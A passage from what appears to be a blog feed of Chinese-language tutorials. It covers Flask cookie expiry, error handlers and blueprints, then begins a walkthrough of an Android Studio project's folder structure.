class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>设置了cookie的过期时间是60秒，那么一分钟以后，再次访问时，页面里显示的内容就是hello world， 服务以为我是第一次来，原因是cookie已经失效，能够记录我第一次来访问的信息已经不存在了。</p>
<h2 id="2-通过expires-设置过期时间"><a href="#2-通过expires-设置过期时间" class="headerlink" title="2. 通过expires 设置过期时间"></a>2. 通过expires 设置过期时间</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 尝试获取 first_access cookie</span></span><br><span class="line">    first_access = request.cookies.get(<span class="string">&#x27;first_access&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> first_access <span class="keyword">is</span> <span class="literal">None</span>:        <span class="comment"># 没有first_access cookie， 是第一次来</span></span><br><span class="line">        first_access = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        res = make_response(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">        expires_time = datetime(year=<span class="number">2021</span>, month=<span class="number">9</span>, day=<span class="number">7</span>, hour=<span class="number">18</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;first_access&#x27;</span>, first_access, expires=expires_time)        <span class="comment"># 在响应头里设置cookie</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:       <span class="comment"># 不是第一次来</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;你第一次访问这个网页的时间是: <span class="subst">&#123;first_access&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>我设置cookie的过期时间是9月7日的18点，但通过浏览器查看cookie信息，显示过期时间是9月8日的凌晨2点，相差了8个小时，这是因为浏览器里会主动加8个小时，想要和我们的北京时间保持一致，在设置的时候就要减去8个小时。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">expires_time = datetime(year=<span class="number">2021</span>, month=<span class="number">9</span>, day=<span class="number">7</span>, hour=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>现在的cookie过期时间是9月7日下午18点。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[结交]</title>
    <url>/2023/07/07/2023-7-7-Flask-9/</url>
    <content><![CDATA[<h1 id="flask的-errorhandler装饰器实现应用错误处理"><a href="#flask的-errorhandler装饰器实现应用错误处理" class="headerlink" title="flask的 errorhandler装饰器实现应用错误处理"></a>flask的 errorhandler装饰器实现应用错误处理</h1><p>flask提供了一个专门用来处理应用错误的装饰器errorhandler。 使用此装饰器，可以轻松的实现对系统错误异常的捕捉和处理。</p>
<p>errorhandler可以传入http code,例如404，500。这是比较常见的请求错误，如果能够为这种错误提供专门的页面，无疑会提高用户的体验。除了http code， 也可以传入异常类，捕捉特定的异常。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>():</span><br><span class="line">    <span class="keyword">raise</span> ValueError</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;捕捉到404&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">ZeroDivisionError</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_except</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;捕捉到异常&#x27;</span>+ <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_all_except</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;捕捉任意异常&#x27;</span>+ <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<blockquote><p>可以捕捉特定的异常，做特定的处理，也可以捕捉任意异常，只需要传入参数Exception即可。</p>
<p>如果某个特定异常被抛出后，有专门处理的函数，那么优先由这个函数进行处理。</p>
<p>例如视图函数index抛出ZeroDivisionError，那么优先由catch_except函数进行处理，如果没有专门的处理函数，则由catch_all_except进行处理。</p>
<p>如果错误发生在蓝图里，则优先由在蓝图里注册的错误处理器进行处理，404错误不在其中，因为404错误发生的更早，蓝图里检测不到。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/flask-errorhandler.html">www.coolpython.net/flask_tutorial/basic/flask-errorhandler.html</a></cite></footer></blockquote>

<h1 id="flask-web开发中使用cookie"><a href="#flask-web开发中使用cookie" class="headerlink" title="flask web开发中使用cookie"></a>flask web开发中使用cookie</h1><p>在web编程中，cookie和session的区别与联系并不容易弄懂。cookie与session是一项只和终端用户联系紧密的技术。</p>
<h2 id="1-http协议无状态"><a href="#1-http协议无状态" class="headerlink" title="1. http协议无状态"></a>1. http协议无状态</h2><p>首先，http协议是一个无状态的协议。所谓的无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态，这意味着每个请求都是独立的。</p>
<p>无状态就会产生一些问题。假设你编写了一个网站，想要记录一下用户第一次访问你网站的时间，当用户下一次访问时，你在页面里显示他第一次登录的时间。</p>
<p>看起来似乎很简单，但现在要再追加一个条件，用户不会在网站上注册，下一次访问的时候也不会登录，就变难了。这个事情的难点在于，我们无法知道用户是否是第一次来访问你的网站。换一个角度看，用户发起的请求里，有没有什么数据是可以唯一代表这个用户的。</p>
<p>这就是对http协议无状态的理解，不知道用户的状态，每一次请求对于你来说都是独立的，全新的，当连续收到3个请求时，我们无法知道这3个请求是一个人发了3次还是3个人各自发了一次。</p>
<h2 id="2-cookie的作用"><a href="#2-cookie的作用" class="headerlink" title="2. cookie的作用"></a>2. cookie的作用</h2><p>cookie技术可以解决以上的问题。</p>
<p>cookie是在服务端生成的，发送给客户端（浏览器），浏览器会保存cookie数据，等客户端再发起请求时，会在请求头里带上cookie信息。</p>
<p>服务端收到请求后，可以从请求头里拿到cookie， cookie里的信息就可以帮助服务端做一些重要的事情。</p>
<h2 id="2-1-怎么判断用户是第一次访问"><a href="#2-1-怎么判断用户是第一次访问" class="headerlink" title="2.1 怎么判断用户是第一次访问"></a>2.1 怎么判断用户是第一次访问</h2><p>很简单，服务端收到请求后，从请求头里尝试获取cookie，如果有，说明不是第一次来，如果没有，那就是第一次来。</p>
<p>我们先考虑第一次来的情况，既然是第一次，服务端需要获取当前时间，在响应头的cookie里设置这个时间，这样就把第一次访问网站的时间发送给了用户。</p>
<h2 id="2-2-cookie信息的保存与使用"><a href="#2-2-cookie信息的保存与使用" class="headerlink" title="2.2 cookie信息的保存与使用"></a>2.2 cookie信息的保存与使用</h2><p>浏览器收到服务端的response后，会把cookie信息保存起来，保存的动作，你感知不到，浏览器自己完成，不过你可以查看。</p>
<p>最关键的步骤来了，当你再一次访问服务时，浏览器发送请求时会自动的把cookie信息带上，这个动作你也感知不到，浏览器自己完成。</p>
<h2 id="2-3-服务端收到cookie"><a href="#2-3-服务端收到cookie" class="headerlink" title="2.3 服务端收到cookie"></a>2.3 服务端收到cookie</h2><p>假设存在cookie，说明不是第一次访问（手动清除的情况除外）。从请求头里拿到cookie，得到的内容是这个用户第一次访问服务时的时间，服务端可以在返回的数据里加上这个时间，告诉用户第一次访问网站的时间。</p>
<p>http协议的无状态特性严重的影响了web服务功能的开发，很多的请求和响应是需要承上启下的，为此，发展出来了cookie和session。</p>
<h2 id="3-flask-cookie-实践"><a href="#3-flask-cookie-实践" class="headerlink" title="3. flask cookie 实践"></a>3. flask cookie 实践</h2><p>下面使用flask框架实现第一节里的功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 尝试获取 first_access cookie</span></span><br><span class="line">    first_access = request.cookies.get(<span class="string">&#x27;first_access&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> first_access <span class="keyword">is</span> <span class="literal">None</span>:        <span class="comment"># 没有first_access cookie， 是第一次来</span></span><br><span class="line">        first_access = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        res = make_response(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;first_access&#x27;</span>, first_access)        <span class="comment"># 在响应头里设置cookie</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:       <span class="comment"># 不是第一次来</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;你第一次访问这个网页的时间是: <span class="subst">&#123;first_access&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>启动服务后，在浏览器里访问 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F; ， 页面里显示的是 “hello world”， 通过浏览器的开发者功能可以查看到服务端响应头信息
 <img src="http://www.coolpython.net/pictures/flask_tutorial/basic/flask-web-cookie-1631107263-0.jpg" alt="img"></p>
<p>服务端就是通过<strong>Set-Cookie</strong>首部来传输cookie信息的，浏览器收到数据后，就会将其保存下来。</p>
<p>接下来，你再次在浏览器里访问http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;，页面里显示的内容是 “你第一次访问这个网页的时间是: 2021-09-03 11:31:00”，通过浏览器的开发者工具可以查看到http请求的首部信息
 <img src="http://www.coolpython.net/pictures/flask_tutorial/basic/flask-web-cookie-1631107263-1.jpg" alt="img"></p>
<p>可以看到，cookie里有first_access， 服务端就是根据这里的信息才知道你第一次访问的时间。</p>
<h2 id="4-遗留问题"><a href="#4-遗留问题" class="headerlink" title="4. 遗留问题"></a>4. 遗留问题</h2><p>本文的重点是讲述cookie的作用并使用flask框架实现一个简单的web服务实现显示用户第一次访问时间的功能，由于篇幅有限，还有一些遗留问题需等到后续的文章进行讲解：</p>
<ol>
<li>如果关闭浏览器，再次打开浏览器，就不能显示我第一次访问的时间了，这个问题涉及到cookie的过期时间问题</li>
<li>cookie里的信息都是明文保存的，这很危险，这个问题涉及到cookie加密</li>
<li>cookie与session有什么区别呢？</li>
</ol>
<p><code>本文均摘自COOLPYTHON，略有修改。</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[认同]</title>
    <url>/2023/07/07/2023-7-7-Flask-8/</url>
    <content><![CDATA[<h1 id="使用蓝图-blueprint"><a href="#使用蓝图-blueprint" class="headerlink" title="使用蓝图 blueprint"></a>使用蓝图 blueprint</h1><h2 id="1-一个最小的应用"><a href="#1-一个最小的应用" class="headerlink" title="1. 一个最小的应用"></a>1. 一个最小的应用</h2><p>蓝图(blueprint)技术，可以实现flask应用的模块划分。</p>
<p>在组织flask代码时，有<strong>功能式架构</strong>和<strong>分区式架构</strong>两种模式，使用蓝图，可以让项目架构更有层次，模块划分更便捷..</p>
<p>下面这个示例非常的小巧，但是能提供的内容非常的少。</p>
<p>在实际开发大型的flask应用时，我们会需要划分许多模块，提供很多的功能 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">5678</span>)</span><br></pre></td></tr></table></figure>

<h2 id="2-一个稍大点的flask应用"><a href="#2-一个稍大点的flask应用" class="headerlink" title="2. 一个稍大点的flask应用"></a>2. 一个稍大点的flask应用</h2><p>下面的flask应用里，有一个user模块专门提供和用户有关的功能。</p>
<p>例如用户注册，登录，登出，修改密码。</p>
<p>还有一个admin模块，用来做后台管理。</p>
<p>这个示例展示了如何在一个脚本里编写所有的模块，但这些视图函数并没有具体的实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># user模块</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/modify_password&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_password</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;modify_password&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># admin模块</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/alluser&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alluser</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;alluser&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/deluser&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deluser</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;deluser&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">5678</span>)</span><br></pre></td></tr></table></figure>

<p>和最小的flask应用相比，这个应用多了两个模块，5个视图函数，但还是非常小。</p>
<p>在实践项目中，子模块和视图函数会更多。因此，我们应该尽量避免将这些都写在同一个脚本中。</p>
<p>否则，这个脚本会非常的大，难以维护。</p>
<h2 id="3-BluePrint-蓝图技术"><a href="#3-BluePrint-蓝图技术" class="headerlink" title="3. BluePrint 蓝图技术"></a>3. BluePrint 蓝图技术</h2><p>蓝图技术，可以帮助你实现flask应用的模块划分。如果不划分模块或者模块划分不合理，会带来很多麻烦。</p>
<p>第2小节的应用划分出两个模块，划分后，项目结构不再是一个单一的脚本，一个模块拥有一个属于自己的文件目录，与之相关的代码都将写在这里，项目结构如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">blue-example/</span><br><span class="line">├── admin</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── app.py</span><br><span class="line">└── user</span><br><span class="line">    ├── __init__.py</span><br><span class="line">    └── views.py</span><br></pre></td></tr></table></figure>

<p>以下展示脚本内容</p>
<h3 id="3-1-app-py"><a href="#3-1-app-py" class="headerlink" title="3.1 app.py"></a>3.1 app.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> admin <span class="keyword">import</span> admin_blue</span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> user_blue</span><br><span class="line"></span><br><span class="line">app.register_blueprint(admin_blue)</span><br><span class="line">app.register_blueprint(user_blue)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">5678</span>)</span><br></pre></td></tr></table></figure>

<p>app.py 代码干净整洁</p>
<h3 id="3-2-user模块"><a href="#3-2-user模块" class="headerlink" title="3.2 user模块"></a>3.2 user模块</h3><p><strong>user&#x2F;<strong>init</strong>.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line">user_blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__, url_prefix=<span class="string">&#x27;/user&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure>

<p><strong>user&#x2F;views.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> user_blue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># user模块</span></span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> user_blue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># user模块</span></span><br><span class="line"><span class="meta">@user_blue.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@user_blue.route(<span class="params"><span class="string">&#x27;/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@user_blue.route(<span class="params"><span class="string">&#x27;/modify_password&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_password</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;modify_password&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-admin"><a href="#3-3-admin" class="headerlink" title="3.3 admin"></a>3.3 admin</h3><p><strong>admin&#x2F;<strong>init</strong>.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin_blue = Blueprint(<span class="string">&#x27;admin&#x27;</span>, __name__, url_prefix=<span class="string">&#x27;/admin&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure>

<p><strong>admin&#x2F;views.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> admin <span class="keyword">import</span> admin_blue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># admin模块</span></span><br><span class="line"><span class="meta">@admin_blue.route(<span class="params"><span class="string">&#x27;/alluser&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alluser</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;alluser&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin_blue.route(<span class="params"><span class="string">&#x27;/deluser&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deluser</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;deluser&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第3小节的项目代码，多了一些模块的划分和文件目录。</p>
<p>看上去，比第2小节的代码变复杂了些，但这种“复杂”是值得的， 能得到整个项目清晰的结构，很好的控制了单个脚本的代码规模。</p>
<h2 id="4-两种代码组织形式"><a href="#4-两种代码组织形式" class="headerlink" title="4. 两种代码组织形式"></a>4. 两种代码组织形式</h2><p>蓝图在组织flask代码时，有两种形式</p>
<ol>
<li>功能式架构</li>
<li>分区式架构</li>
</ol>
<p>前面所展示的就是功能式架构，一个功能，一个模块组织成一个蓝图，他们共用相同的静态资源，静态资源放在static目录下。</p>
<p>本文所举实例太简单，因此没有创建静态资源，功能式架构类似于下面的结构</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">__init__.py</span><br><span class="line">static/</span><br><span class="line">templates/</span><br><span class="line">    home/</span><br><span class="line">    control_panel/</span><br><span class="line">    admin/</span><br><span class="line">views/</span><br><span class="line">    __init__.py</span><br><span class="line">    home.py</span><br><span class="line">    control_panel.py</span><br><span class="line">    admin.py</span><br><span class="line">models.py</span><br></pre></td></tr></table></figure>

<p>home, control_panel,admin 都是蓝图，他们共用static和 templates。</p>
<p>分区式架构，适用于子模块有特殊需要的情况，在创建蓝图构造Blueprint对象时，可以指定static和templates。</p>
<p>结构示例：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">yourapp/</span><br><span class="line">    __init__.py</span><br><span class="line">    admin/</span><br><span class="line">        __init__.py</span><br><span class="line">        views.py</span><br><span class="line">        static/</span><br><span class="line">        templates/</span><br><span class="line">    home/</span><br><span class="line">        __init__.py</span><br><span class="line">        views.py</span><br><span class="line">        static/</span><br><span class="line">        templates/</span><br><span class="line">    control_panel/</span><br><span class="line">        __init__.py</span><br><span class="line">        views.py</span><br><span class="line">        static/</span><br><span class="line">        templates/</span><br><span class="line">    models.py</span><br></pre></td></tr></table></figure>

<blockquote><p>试想，如果admin, home， control_panel有各自不同的页面样式和风格，那么他们就需要不同的静态资源，css,  javascript,每个模块拥有各自的静态资源就是一个合理的选择。这样组织，还有一个好处，一个模块，或者说一个蓝图拥有自身全部的资源，包括static和templates，那么它可以很容易从一个项目里拆分出来放在另一个项目中使用。</p>
<p>具体使用哪种组织架构，并没有强制要求，完全是开发人员随心所欲的，重要的是从项目管理的角度出发，哪一种更利于你所项目的管理，就用哪一种。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/flask-blueprint.html">www.coolpython.net/flask_tutorial/basic/flask-blueprint.html</a></cite></footer></blockquote>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Android项目文件目录分析</title>
    <url>/2023/08/27/2023-8-27-Android%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>相信对第一次接触安卓开发的人来说，安卓应用的项目结构很令人疑惑。</p>
<p>  刚巧，我也是，才下载了 <code>Android Studio</code>不久。看了不少的安卓教程，然后创建了一个示例项目准备摸索摸索。我去，怎么这么多代码，这么多文件，瞬间傻眼了。</p>
<p>  不再傻眼，也为了更多和我一样的小白开发者不再傻眼，跟着我的视角，我们一起走进这个安卓App，看看它到底是个什么构造。</p>
<p>  首先复制项目路径，打开文件管理器，进入我们的安卓项目文件夹。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/%E8%B7%AF%E5%BE%84.png" class="">

<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95.png" class="">

<p>  来到这个页面后，我们看到前缀没有 <code>.</code> 的正常目录有 <code>app</code> 和 <code>gradle</code> 两个文件夹。能走到这一步的同学，必然是创建了项目了，也就安装好了<code>gradle</code>了，所以不再赘述，我们进入<code>app</code>文件夹。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/app%E7%9B%AE%E5%BD%95.png" class="">

<p>  在此之前我已经编译过一次app，因此目录下有</p>
<ul>
<li><p><code>build</code> ：存放着构建后的内容</p>
</li>
<li><p><code>libs</code> : 存放着引用的外部库（因为没有使用里面试试空的）</p>
</li>
<li><p><code>src</code> : 源代码文件夹。</p>
<p>三个文件夹。</p>
</li>
</ul>
<p>因此，我们进入 <code>src</code> 这个文件夹。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/src%E7%9B%AE%E5%BD%95.png" class="">

<p>  <code>src</code> 目录下，有三个文件夹：</p>
<ul>
<li><code>androidText</code> ：存放着Instrumented测试代码。Instrumented测试与单元测试不同，它们可以运行在整个Android应用或框架上，并可以访问Android系统服务和API。 </li>
<li><code>main</code>：存放着主程序。</li>
<li><code>test</code>：存放着单元测试代码。单元测试是软件开发中的一种实践，用于确保代码的各个单元按照预期工作。</li>
</ul>
<p>  很显然我们当务之急需要的是去了解<code>main</code>文件夹中的内容。</p>
<hr>
<p>  访问进去，有两个文件夹和一个<code>AndroidManifest.xml</code>文件。</p>
<p><code>AndroidManifest.xml</code>：在Android程序中，所有的Activity都需要在<code>AndroidManifest.xml</code>中声明，才能够被用户通过INTENT找到。除了Activity以外，服务（Service）、广播接收者（BroadcastReceiver）、ContentProvider都需要在<code>AndroidManifest.xml</code>中声明。</p>
<p>关于这两个文件夹：java |  res</p>
<ul>
<li>java：存放着java代码。（我选择了java项目示例，我选择在深度学习过java开发安卓后再转koutlin）</li>
<li>res : 存放着各种资源文件。（稍后将一一的解释。）</li>
</ul>
<hr>
<p>  下面我将列举一下示例项目中已存在的文件</p>
<p>  <code>java\com\example\magichome</code> 在这个路径下有：<code>data</code>,<code>ui</code>,两个文件夹。</p>
<p>  <code>data</code>文件夹中包含一个<code>model</code>文件夹,还有:</p>
<ol>
<li><p><code>LoginDataSource.java</code>：该类用于处理用户登录和注销的操作。</p>
</li>
<li><p>&#96;&#96;LoginRepository.java&#96;：用于处理用户登录和注销的操作，并维护一个内存中的登录状态和用户凭证信息缓存。</p>
</li>
<li><p><code>Result.java</code>：用于封装处理结果，包括成功的结果和错误的结果。</p>
</li>
</ol>
<p>  总共三个文件。</p>
<p><code>model文件夹</code>：</p>
<ul>
<li><code>LoggedInUser.java</code>：一个数据类，主要用于存储已登录用户的用户信息。这个类是从<code>LoginRepository</code>中获取的。</li>
</ul>
<hr>
<p><code>  ui</code>文件夹中包含一个<code>login</code>文件夹，其中包含:</p>
<ol>
<li><code>LoggedInUserView.java</code>：主要用于将已登录用户的详细信息暴露给用户界面（UI）。</li>
<li><code>LoginActivity.java</code>：实现一个登录活动的 Android 应用程序的一部分。该活动使用数据绑定和<code>ViewModel </code>来管理用户输入和登录状态。</li>
<li><code>LoginFormState.java</code>：主要用于表示登录表单的数据验证状态。</li>
